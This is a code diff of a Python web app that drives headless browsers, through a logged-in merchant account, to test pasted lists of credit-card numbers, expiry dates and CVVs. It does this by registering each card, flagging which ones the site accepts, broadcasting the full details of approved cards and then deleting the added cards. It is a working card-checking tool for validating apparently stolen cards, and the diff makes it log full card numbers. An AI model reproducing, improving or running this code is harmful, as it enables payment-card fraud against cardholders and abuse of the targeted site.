@@ -23,9 +23,6 @@ NOME_FIXO = "Bruna Mendes"
 estado = {
     "rodando": False,
     "clients": set(),
-    "total_cartoes": 0,
-    "processados": 0,
-    "aprovados": 0,
 }
 
 def log(mensagem: str):
@@ -61,14 +58,40 @@ async def websocket_endpoint(websocket: WebSocket):
     except WebSocketDisconnect:
         estado["clients"].discard(websocket)
 
-# ===================== PLAYWRIGHT =====================
+# ===================== FUNÇÕES ORIGINAIS =====================
+async def limpar_cartoes_antigos(page):
+    try:
+        log("[Faxina] Iniciando limpeza...")
+        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
+        await asyncio.sleep(2)
+
+        botoes = page.get_by_role("button", name="Remover")
+        total = await botoes.count()
+
+        if total == 0:
+            log("[Faxina] Nenhum cartão antigo.")
+            return
+
+        for _ in range(total * 3):
+            if await botoes.count() == 0:
+                break
+            await botoes.first.click(force=True)
+            await asyncio.sleep(1)
+            confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
+            if await confirm.is_visible():
+                await confirm.click(force=True)
+                await page.wait_for_load_state("networkidle")
+                await asyncio.sleep(1.5)
+
+        log("[Faxina] Limpeza concluída!")
+    except Exception as e:
+        log(f"[Faxina] Erro: {e}")
+
+
 async def login_mestre(playwright):
     try:
-        log("[Autenticação] Iniciando login...")
-        browser = await playwright.chromium.launch(
-            headless=True,
-            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-        )
+        log("[Autenticação] Iniciando login mestre...")
+        browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox"])
         context = await browser.new_context()
         page = await context.new_page()
 
@@ -89,20 +112,23 @@ async def login_mestre(playwright):
         return False
 
 
-async def worker(id_worker: int, browser, fila: asyncio.Queue):
-    context = await browser.new_context(storage_state="sessao_unimar.json")
-    page = await context.new_page()
-    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-
+async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
     try:
+        await asyncio.sleep(id_worker * 2.5)
+        log(f"[Canal {id_worker}] Abrindo aba...")
+        context = await browser.new_context(storage_state="sessao_unimar.json")
+        page = await context.new_page()
+        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
+
         while not fila.empty() and estado["rodando"]:
-            idx, linha, _ = await fila.get()
+            item = await fila.get()
+            indice, linha, tentativas = item
             try:
                 numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                log(f"[Canal {id_worker}] #{idx} → {numero[-4:]}")
+                log(f"[Canal {id_worker}][Item {indice}] Processando: {numero}")
 
                 await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-                await asyncio.sleep(random.uniform(0.5, 1.5))
+                await asyncio.sleep(random.uniform(1.0, 2.5))
 
                 await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
 
@@ -115,23 +141,21 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue):
                 botoes_antes = await page.get_by_role("button", name="Remover").count()
                 await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
 
-                for _ in range(20):
+                for _ in range(30):
                     if not estado["rodando"]: break
                     if await page.get_by_role("button", name="Remover").count() > botoes_antes:
-                        log(f"[Canal {id_worker}] ✅ APROVADO: {numero[-4:]}")
+                        log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                         await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
-                        estado["aprovados"] += 1
                         break
 
                     body = (await page.locator("body").inner_text()).lower()
                     if any(x in body for x in ["inválida", "recusado", "erro"]):
-                        log(f"[Canal {id_worker}] ❌ Reprovado: {numero[-4:]}")
+                        log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                         break
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(1.5)
             except Exception as e:
-                log(f"[Erro] Item #{idx}: {e}")
+                log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
             finally:
-                estado["processados"] += 1
                 fila.task_done()
     finally:
         await context.close()
@@ -142,10 +166,6 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
         linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
         linhas = list(dict.fromkeys(linhas))
 
-        estado["total_cartoes"] = len(linhas)
-        estado["processados"] = 0
-        estado["aprovados"] = 0
-
         fila = asyncio.Queue()
         for idx, linha in enumerate(linhas, 1):
             await fila.put((idx, linha, 1))
@@ -154,11 +174,8 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
             if not await login_mestre(pw):
                 return
 
-            browser = await pw.chromium.launch(
-                headless=True,
-                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-            )
-            tasks = [asyncio.create_task(worker(i, browser, fila)) for i in range(1, num_canais + 1)]
+            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
+            tasks = [asyncio.create_task(worker_contexto(i, browser, fila)) for i in range(1, num_canais + 1)]
             await asyncio.gather(*tasks, return_exceptions=True)
 
             await browser.close()
@@ -189,7 +206,7 @@ async def iniciar(data: IniciarRequest):
 @app.post("/api/parar")
 async def parar():
     estado["rodando"] = False
-    log("⛔ Teste interrompido.")
+    log("⛔ Interrupção solicitada.")
     await broadcast("status", {"rodando": False})
     return {"status": "parando"}
 
